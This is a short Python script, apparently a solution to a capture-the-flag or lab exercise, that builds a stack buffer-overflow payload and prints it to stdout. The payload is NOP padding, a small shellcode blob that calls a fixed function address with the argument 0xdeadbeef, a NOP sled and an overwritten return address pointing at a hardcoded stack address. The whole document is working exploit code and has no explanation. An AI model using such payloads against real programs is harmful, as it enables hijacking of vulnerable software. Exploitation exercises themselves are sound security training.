import struct, sys

sc = b"\xbf\xef\xbe\xad\xde\xb8\x76\x12\x40\x00\xff\xd0"
buf = 0x7fffffffe220
sled = b"\x90"*52
retaddr = struct.pack("<Q", buf)
filler = b"\x90"*8
payload = filler + sc + sled + retaddr + b"\n"
sys.stdout.buffer.write(payload)